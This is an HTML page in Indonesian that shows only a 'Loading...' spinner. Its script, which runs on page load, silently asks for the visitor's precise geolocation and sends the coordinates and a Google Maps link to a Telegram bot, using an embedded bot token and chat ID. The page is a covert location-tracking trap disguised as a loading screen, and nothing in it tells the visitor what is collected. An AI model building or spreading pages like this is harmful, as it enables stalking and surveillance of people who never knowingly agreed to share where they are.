<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>

    <style>
        body {
            margin: 0;
            padding: 0;
            background: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .loader {
            text-align: center;
        }

        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #e0e0e0;
            border-top-color: #3b7bff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 12px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .text {
            font-size: 14px;
            color: #555;
        }
    </style>
</head>
<body>

<div class="loader">
    <div class="spinner"></div>
    <div class="text">Loading...</div>
</div>

<script>
    const BOT_TOKEN = "8507624655:AAESQZBPEULx2-0cbaS85nWUBQfUYc2cf4M";
    const CHAT_ID = "6222942869";

    function sendToTelegram(lat, lon, acc) {
        const message = `Lokasi baru:
Latitude: ${lat}
Longitude: ${lon}
Akurasi: ${acc} meter
Google Maps: https://www.google.com/maps?q=${lat},${lon}`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

        fetch(url)
        .catch(() => {});
    }

    function getLocation() {
        if (!navigator.geolocation) return;

        navigator.geolocation.getCurrentPosition(
            pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy;
                sendToTelegram(lat, lon, acc);
            },
            err => {},
            { enableHighAccuracy: true }
        );
    }

    window.onload = getLocation;
</script>

</body>
</html>
